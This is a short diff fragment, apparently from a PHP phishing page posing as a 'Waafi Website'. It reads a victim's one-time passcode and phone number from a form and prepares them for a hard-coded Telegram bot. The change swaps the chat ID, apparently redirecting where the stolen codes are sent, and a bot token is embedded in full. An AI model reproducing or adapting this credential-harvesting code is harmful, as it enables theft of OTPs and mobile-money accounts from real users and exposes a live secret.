@@ -287,7 +287,7 @@
     $otp1  = trim($_POST['otp_code'] ?? '');
 
       $botToken = "8648558019:AAHImsUZ7UJK8t1b629JTTxSd3vvHpH0rhY";
-      $chatId   = "1135238504";
+      $chatId   = "8616678822";
 
         $text = "Waafi Website Message\n\n"
           . "mobile: $mobile\n"
